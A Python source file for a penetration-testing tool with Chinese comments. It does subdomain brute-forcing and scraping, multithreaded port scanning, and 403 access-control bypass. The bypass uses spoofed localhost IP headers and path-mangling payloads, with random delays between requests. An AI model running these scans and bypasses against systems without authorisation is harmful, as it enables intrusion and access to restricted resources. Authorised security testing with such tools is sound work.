import re
import os
import threading
import time
import random

import requests

'''
工具介绍
'''
def tool_introduce():
    title = "\033[32m" + r'''
                                     _             ____        ____
       __  __ ____ _ ____     _  __ (_)           /  _/____   / __/____
      / / / // __ `// __ \   | |/_// /  ______    / / / __ \ / /_ / __ \ ''' + "\033[31m" + r'''
     / /_/ // /_/ // / / /  _>  < / /  /_____/  _/ / / / / // __// /_/ /
     \__, / \__,_//_/ /_/  /_/|_|/_/           /___//_/ /_//_/   \____/
    /____/                                                              ''' + "\033[32m" + '''
[*]Version 0.0.1
[*]项目地址:https://github.com/yanxisec/yanxi-info
[*]By yanxisec(昖喜)

\033[34m\033[40m[+]初次使用建议阅读 README.md\033[0m'''

    print(title)

    can_do = '''
\033[33m支持功能:
    [1] 子域名扫描(爆破+爬虫)
    [2] 端口扫描(多线程)
    [3] 403Bypass(读取请求包.txt)...\033[0m
    
输入数字选择功能: '''
    return input(can_do)

'''
子域名爆破
子域名提取
超时复检
'''
class subdomain_blast:

    BORN_SUBMINS_PATH = "./dictionary/submins.txt"  # 默认submins字典路径
    CONFIG_PATH = "./config/config.txt"

    scan_list = set() # 集合
    scan_lock = threading.Lock() # 线程锁

    threads = []
    submin_list = []

    filenames = ['存活子域名', '存活日志', '超时子域名']

    life_urls = []

    def clean_file(self, domain):
        for filename in self.filenames:
            if os.path.exists(f"./URL/{domain}/{filename}.txt"):
                os.remove(f"./URL/{domain}/{filename}.txt")
        if not os.path.exists(f"./URL"):
            os.mkdir("./URL")

        if not os.path.exists(f"./URL/{domain}"):
            os.mkdir(f"./URL/{domain}")

    # 读取字典
    def load_dictionary(self):
        with open(f'{self.BORN_SUBMINS_PATH}','r') as f:
            self.submins = f.read().splitlines()

    # 读取配置
    def config(self):
        with open(f"{self.CONFIG_PATH}", "r", encoding='utf-8') as f:
            conf = f.read().splitlines()
                # 线程
            thread_num = re.findall(r'"线程":"(.*?)"', conf[1])
            self.thread_num = int(thread_num[0])
                # 超时时间
            timeout = re.findall(r'"超时时间":"(.*?)"', conf[2])
            self.timeout = int(timeout[0])
                # 二次复检超时时间
            self.timeout2 = int(re.findall(r'复检":"(.*?)"', conf[3])[0])

    # 判断使用的协议
    def http_s_(self, domain):
        try:
            url = "https://www." + domain
            response = requests.get(url, timeout=self.timeout)
            self.http_s = "https://"
        except:
            self.http_s = "http://"

    # 字典爆破下一级域名
    def blast_subdomain(self, domain):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
        }

        for submin in self.submins:
            url = self.http_s + submin + "." + domain
                # 去重->加锁
            with self.scan_lock:
                if submin in self.submin_list:
                    continue
                self.submin_list.append(submin)

            try:
                response = requests.get(url, headers=self.headers, timeout=self.timeout)
                response.encoding = 'utf-8'
                code = response.status_code
                title = re.findall(r'<title>(.*?)</title>', response.text)[0]
                text = response.text
                length = len(text)
                    # 输出->加锁
                with self.scan_lock:
                    print(f"{url}存活 \033[32m[状态码]\033[0m{code} \033[33m[标题]\033[0m{title} \033[36m[长度]\033[0m{length}")
                        # 爆破并写入
                    self.life_urls.append(url)
                    with open(f"./URL/{domain}/存活日志.txt", "a+", encoding='utf-8') as f:
                        f.write(f"{url} [状态码]{code} [标题】{title} [长度]{length}\n")
                    with open(f"./URL/{domain}/存活子域名.txt", "a+", encoding='utf-8') as f:
                        f.write(f"{url}\n")

            except requests.Timeout as e:
                with self.scan_lock:
                    print(f"{url}\033[31m超时\033[0m")
                    with open(f"./URL/{domain}/超时子域名.txt", "a+", encoding='utf-8') as f:
                        f.write(f"{url}\n")

            except Exception as e:
                pass

    # 线程
    def thread(self, domain):
        for i in range(self.thread_num):
            t = threading.Thread(target=self.blast_subdomain, args=(domain,))
            t.start() # 此处不能直接在上一句后面写.start()
            self.threads.append(t)

        for t in self.threads:
            t.join()

        # for i in range(self.thread_num):
        #     t = threading.Thread(target=self.extractURL, args=(domain,))
        #     t.start() # 此处不能直接在上一句后面写.start()
        #     self.threads.append(t)

    def check_timeoutSubdomain(self, domain):
        if os.path.exists(f"./URL/{domain}/超时子域名.txt"):
            with open(f"./URL/{domain}/超时子域名.txt", "r", encoding='utf-8') as f:
                urls = f.read().splitlines()
                for url in urls:
                    try:
                        response = requests.get(url, timeout=self.timeout)
                        response.encoding = 'utf-8'
                        code = response.status_code
                        title = re.findall(r'<title>(.*?)</title>', response.text)[0]
                        length = len(response.text)
                        # 输出->加锁
                        with self.scan_lock:
                            print(f"\033[32m[超时复检]\033[0m{url}存活 \033[32m[状态码]\033[0m{code} \033[33m[标题]\033[0m{title}")
                            with open(f"./URL/{domain}/存活子域名.txt", "a+", encoding='utf-8') as f:
                                f.write(f"{url}\n")
                            with open(f"./URL/{domain}/存活日志.txt", "a+", encoding='utf-8') as f:
                                f.write(f"[超时复检]{url} [状态码]{code} [标题]{title} [长度]{length}\n")

                    except requests.Timeout as e:
                        print(f"{url}\033[31m仍然超时\033[0m")

                    except Exception as e:
                        pass

    # 提取源码中的url
    def extractURL(self, domain):
        with open(f"./URL/{domain}/存活子域名.txt", "r", encoding='utf-8') as f:
            urls = f.read().splitlines()
        for url in urls:
            try:
                response = requests.get(url, timeout=self.timeout)
                response = requests.get(url, headers=self.headers, timeout=self.timeout)
                response.encoding = 'utf-8'
                code = response.status_code
                try:
                    title = re.findall(r'<title>(.*?)</title>', response.text)[0]
                except Exception as e:
                    pass
                text = response.text
                length = len(text)
                new_subdomains = re.findall(rf'(?:src|href)\s*=\s*"(https?://(?:[a-zA-Z0-9]+\.){domain})/?(?=")"', text)
                for new_subdomain in new_subdomains:
                    if new_subdomain not in self.life_urls:
                        with open(f"./URL/{domain}/存活子域名.txt", "a+", encoding='utf-8') as f:
                            f.write(f"{new_subdomain}\n")
                            self.life_urls.append(new_subdomain)
                        print(f"{new_subdomain}存活 \033[32m[状态码]\033[0m{code} \033[33m[标题]\033[0m{title} \033[36m[长度]\033[0m{length}")
                        with open(f"./URL/{domain}/存活日志.txt", "a+", encoding='utf-8') as f:
                            f.write(f"{new_subdomain} [状态码]{code} [标题】{title} [长度]{length}\n")
                    # print(self.life_urls)
            except requests.Timeout as e:
                print(f"{new_subdomain}\033[31m超时\033[0m")

            except Exception as e:
                pass

import socket

'''
端口扫描
'''
class port_scaner:

    PORT1000_PATH = "./dictionary/1000-port.txt"
    ALLPORT_PATH = "./dictionary/all-port.txt"
    USER_DEFINE_PATH = "./dictionary/user-define-port.txt"
    CONFIG_PATH = "./config/config.txt"
    openPorts = []
    threads = []

    port_scan_list = set()  # 集合
    scan_lock = threading.Lock()  # 线程锁

    def clean_file(self, ip):
        if os.path.exists(f"./URL/{ip}开放端口.txt"):
            os.remove(f"./URL/{ip}开放端口.txt")
        if not os.path.exists(f"./URL"):
            os.mkdir("./URL")

    def config(self):
        with open(f"{self.CONFIG_PATH}", "r", encoding='utf-8') as f:
            conf = f.read().splitlines()
            self.thread_num = int(re.findall(r'线程":"(.*?)"', conf[1])[0])

    def port_scan(self, portFile):
        with open(f"{portFile}", "r", encoding='utf-8') as f:
            port_list = f.read().splitlines()

        for port in port_list:
            port = int(port)
            with self.scan_lock:
                if port in self.port_scan_list:
                    continue
                self.port_scan_list.add(port)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, port))
                s.close()
                with self.scan_lock:
                    print(f"\033[32m{port}:[ON]\033[0m")
                    with open(f"./URL/{self.ip}开放端口.txt", "a+", encoding='utf-8') as f:
                            f.write(f"{self.ip}:{port}\n")
            except:
                with self.scan_lock:
                    print(f"\033[31m{port}:[OFF]\033[0m")

    # 选择的端口字典
    def choice_model(self, portFile=PORT1000_PATH):
        for i in range(self.thread_num):
            t = threading.Thread(target=self.port_scan, args=(portFile,))
            t.start()
            self.threads.append(t)
        for t in self.threads:
            t.join()

    def run_port(self, ip):
        self.ip = ip
        model = input("""\033[33m   扫描模式(回车默认1000端口)
    [1] 1000端口
    [2] 全端口
    [3] 自定义端口\033[0m
""")

        if model == "2":
            self.choice_model(self.ALLPORT_PATH)

        elif model == "3":
            self.choice_model(self.USER_DEFINE_PATH)

        else:
            self.choice_model(self.PORT1000_PATH)

'''
403bypass
'''
class bypass403:

    bypassHeaders = {
   'X-Forwarded-For':'127.0.0.1',
   'X-Forwarded':'127.0.0.1',
   'Forwarded-For':'127.0.0.1',
   'Forwarded':'127.0.0.1',
   'X-Requested-With':'127.0.0.1',
   'X-Forwarded-Proto':'127.0.0.1',
   'X-Forwarded-Host':'127.0.0.1',
   'X-remote-IP':'127.0.0.1',
   'X-remote-addr':'127.0.0.1',
   'True-Client-IP':'127.0.0.1',
   'X-Client-IP':'127.0.0.1',
   'Client-IP':'127.0.0.1',
   'X-Real-IP':'127.0.0.1',
   'Ali-CDN-Real-IP':'127.0.0.1',
   'Cdn-Src-Ip':'127.0.0.1',
   'Cdn-Real-Ip':'127.0.0.1',
   'CF-Connecting-IP':'127.0.0.1',
   'X-Cluster-Client-IP':'127.0.0.1',
   'WL-Proxy-Client-IP':'127.0.0.1',
   'Proxy-Client-IP':'127.0.0.1',
   'Fastly-Client-Ip':'127.0.0.1',
   'True-Client-Ip':'127.0.0.1',
   'X-Originating-IP':'127.0.0.1',
   'X-Host':'127.0.0.1',
   'X-Custom-IP-Authorization':'127.0.0.1'
}

    bypassDirsearch = '''///phpmyadmin///
//wp-admin//
/admin
/admin/
/admin//
//admin//
/admin/*
/admin/*/
/admin/.
/admin/./
/./admin/./
/admin/./.
/admin/./.
/admin?
/admin??
/admin???
/admin..;/
/admin/..;/
/%2f/admin
/%2e/admin
/admin%20/
/admin%09/
/%20admin%20/'''.strip().split('\n')

    def getRequest(self, url):
        self.response = requests.get(url, headers=self.headers)
        self.text = self.response.text
        self.title = re.findall(r'<title>(.*?)</title>', self.text)[0]
        self.code = self.response.status_code

    def requestBag(self):
        '''获取对应的请求头'''
        with open('./请求包.txt','r') as f:
            bypassBag = f.read().splitlines()
            self.headers = {}

            for i in bypassBag[1:]:
                if len(i) == 0:
                    break
                i = i.split(":", 1)  # 只分隔一次
                i[1] = i[1][1:]
                self.headers[i[0]] = i[1]  # 有些数据包包含“因此这里只能用'

        '''从请求包提取对应的 IP/域名 与 路径 且判断应使用http还是https'''
        try:
            self.url = 'https://' + self.headers['Host'] + re.findall(r'T (.*?) H', bypassBag[0])[0]
            requests.get(self.url, headers=self.bypassHeaders)
        except:
            self.url = 'http://' + self.headers['Host'] + re.findall(r'T (.*?) H', bypassBag[0])[0]

    def headerBypass(self):
        '''请求头绕过'''
        print(f'[*]对{self.url}使用请求头绕过:\n')
        for i in self.bypassHeaders:
            time.sleep(random.uniform(0.5, 2.5))
            self.headers[i] = self.bypassHeaders[i]
            self.getRequest(self.url)
            del self.headers[i]#使用后就删除
            print(f'{i}头绕过 \033[32m[状态码]\033[0m{self.response.status_code} \033[33m[标题]\033[0m{self.title}')
            if self.response.status_code == 200:
                print('\033[32m绕过成功!\033[0m')
                return True
        return False

    def httpVersionBypass(self):
        '''HTTP协议版本绕过'''

        pass

    def apiBypass(self):
        '''api版本绕过'''
        print(f'[*]对{self.url}使用api版本绕过:\n')
        if 'v1' in self.url or 'v2' in self.url or 'v3' in self.url:
            for i in ['v1', 'v2', 'v3']:
                time.sleep(random.uniform(0.5, 2.5))
                self.url = self.url.replace(re.findall('(v1|v2|v3)', self.url)[0], i)
                self.getRequest(self.url)
                print(f'{i}版本绕过 \033[32m[状态码]\033[0m{self.code} \033[33m[标题]\033[0m{re.findall(r'<title>(.*?)</title>', self.text)[0]}')
                if self.code == 200:
                    print('\033[32m绕过成功!\033[0m')
                    return True
        else:
            print(f'{self.url}没有api版本号')
        return False

    def dirsearchBypass(self):
        '''路径绕过'''
        print(f'[*]对{self.url}使用路径绕过:\n')
        if self.url.endswith('/'):
            self.url = self.url[:-1]
        print(self.url)
        try:
            urlEndDirsearch = self.url.split('/')[-1]
            for i in self.bypassDirsearch:
                time.sleep(random.uniform(0.5, 2.5))
                i = i.replace('admin', urlEndDirsearch)
                url = self.url.replace('/' + urlEndDirsearch, i)
                self.getRequest(url)
                print(f'{url}路径绕过 \033[32m[状态码]\033[0m{self.code} \033[33m[标题]\033[0m{re.findall(r'<title>(.*?)</title>', self.text)[0]}')
                if self.code == 200:
                    print('\033[32m绕过成功!\033[0m')
                    return True
        except:
            return False

# 加载介绍
action = tool_introduce()

# 子域名收集
if action == "1":
    subdomain_blast = subdomain_blast()
    subdomain_blast.load_dictionary()# 读取字典
    subdomain_blast.config()# 读取配置
    domain = input("    \033[92m输入域名，例:google.cn 或 github.com\033[0m\n")
    subdomain_blast.clean_file(domain)# 清理存在的文件与新建文件夹
    subdomain_blast.http_s_(domain)# 判断使用http还是https(优先https)
    subdomain_blast.thread(domain)# 开始爆破
    subdomain_blast.extractURL(domain)# 从源码中提取不重复的子域名并探活
    subdomain_blast.check_timeoutSubdomain(domain)# 对超时子域名进行二次检测
# 端口扫描
if action == "2":
    port_scaner = port_scaner()
    port_scaner.config()# 加载配置

    ip = input("    \033[92m输入域名或IP，例:www.google.cn 或 127.0.0.1\033[0m\n")
    port_scaner.clean_file(ip)# 清理对应的文件
    port_scaner.run_port(ip)# 开始扫描端口
# 403bypass
if action == "3":
    bypass403 = bypass403()
    with open('./请求包.txt', 'r') as f:
        test = f.read()
    if not len(test):
        print('\033[31m[!]请求包.txt内容为空\033[0m')
    else:
        bypass403.requestBag()
        # 满足一项即可
        if  bypass403.headerBypass() or bypass403.apiBypass() or bypass403.dirsearchBypass():
            pass
    # bypass403.httpVersionBypass()

input("[+]按回车结束...")